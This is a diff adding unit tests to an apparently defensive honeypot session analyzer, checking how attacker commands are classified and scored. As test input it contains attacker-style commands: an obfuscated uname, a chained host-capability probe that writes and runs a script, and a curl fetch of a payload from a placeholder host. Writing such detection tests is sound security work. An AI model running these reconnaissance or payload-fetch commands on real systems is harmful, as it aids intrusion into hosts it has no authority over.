@@ -62,6 +62,27 @@ def test_plain_system_discovery_is_not_mislabeled_as_honeypot_probe() -> None:
     assert [item.category for item in detections] == ["system_discovery"]
 
 
+def test_path_obfuscated_uname_is_still_system_discovery() -> None:
+    detections = analyze_session([_command_event("/bin/./uname -s -v -n -r -m")])
+
+    assert [item.category for item in detections] == ["system_discovery"]
+
+
+def test_multi_signal_host_suitability_probe_gets_specific_detection() -> None:
+    command = (
+        "uname=$(uname -a); uptime=$(cat /proc/uptime); "
+        "gpu=$(lspci | grep -i nvidia); echo ===SHELL_BEHAVIOR===; "
+        "printf '#!/bin/sh\\necho ok\\n' > filter && chmod +x filter && ./filter"
+    )
+
+    detections = analyze_session([_command_event(command)])
+    by_category = {item.category: item for item in detections}
+
+    assert "host_capability_probe" in by_category
+    assert by_category["host_capability_probe"].score == 84
+    assert by_category["host_capability_probe"].confidence == "high"
+
+
 def test_transfer_and_execution_preparation_are_separate_detections() -> None:
     events = [
         _command_event("curl https://payload.invalid/a -o /tmp/a"),
@@ -71,3 +92,27 @@ def test_transfer_and_execution_preparation_are_separate_detections() -> None:
     categories = {item.category for item in analyze_session(events)}
 
     assert categories == {"execution_preparation", "payload_delivery"}
+
+
+def test_empty_upload_is_low_score_and_not_a_captured_artifact() -> None:
+    event = StoredEvent(
+        event_id="empty-upload",
+        event_type="artifact_captured",
+        timestamp=datetime(2026, 8, 29, 9, 0, tzinfo=UTC),
+        sensor_id="test-sensor",
+        session_id="test-session",
+        source_ip="192.0.2.20",
+        data={
+            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+            "size_bytes": 0,
+            "origin": "direct_upload",
+            "role": "unknown",
+            "capture_status": "empty_upload",
+        },
+    )
+
+    detections = analyze_session([event])
+
+    assert [(item.category, item.score, item.severity) for item in detections] == [
+        ("empty_upload", 18, "low")
+    ]
